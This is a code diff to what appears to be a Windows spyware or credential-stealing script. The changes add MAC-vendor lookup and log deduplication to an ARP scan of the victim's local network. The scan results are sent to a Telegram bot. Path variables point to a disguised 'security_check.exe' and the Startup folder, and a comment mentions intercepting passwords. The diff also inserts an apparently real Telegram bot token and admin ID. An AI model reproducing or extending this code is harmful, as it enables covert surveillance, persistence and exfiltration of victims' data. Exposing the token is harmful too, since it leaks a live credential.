@@ -18,11 +18,13 @@ import ipaddress
 # from scapy.all import *
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import srp
+from mac_vendor_lookup import MacLookup
+from collections import OrderedDict
 
 MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
 # telegram token and id
-TOKEN = r'some_token'
-ADMIN_ID = r'some_id'
+TOKEN = r'5026728362:AAGzmYf3Qt8vF9rOn4LNaEgPc3JXTtT5dJk'
+ADMIN_ID = r'1820665678'
 USER_NAME = gp.getuser()
 DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/security_check.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
@@ -181,6 +183,8 @@ def log_sender():
         try:
             # call ARP scanner local network of target machine
             arp_scan(f'{local_ip}/24')
+            # call function clean strings in logs
+            clean_result()
             # send logs scan local network to telegram
             files = {
                 'document': open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'rb')}
@@ -208,16 +212,23 @@ def arp_scan(ip):
     request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
     ans, un_ans = srp(request, timeout=2, retry=1)
     result = []
-
     for sent, received in ans:
-        if received.hwsrc not in 'MAC':
-            # collect scan info to list of dictionaries
-            result.append({'IP': received.psrc, 'MAC': received.hwsrc})
-        else:
-            continue
-    # write scan log to file 'local_devices.txt'
-    for i in result:
-        print(i, file=local_dev)
+        # variable for check vendor of mac
+        mac_vendor = MacLookup().lookup(received.hwsrc)
+        # add IP and MAC to list
+        result.append(f'IP:  {received.psrc}  MAC:  {received.hwsrc}  {mac_vendor}')
+        # write scan log to file 'local_devices.txt'
+        for x in result:
+            print(x, file=local_dev)
+
+
+# clean double strings in log file
+def clean_result():
+    dirt_file = f'C:/Users/{USER_NAME}/Downloads/local_devices.txt'
+    with open(dirt_file, 'r', encoding='utf-8') as file:
+        uniq = OrderedDict.fromkeys(file)
+    with open(dirt_file, 'w', encoding='utf-8') as file:
+        file.writelines(uniq)
 
 
 # Intercept pass,  write to file and send text log to Telegram
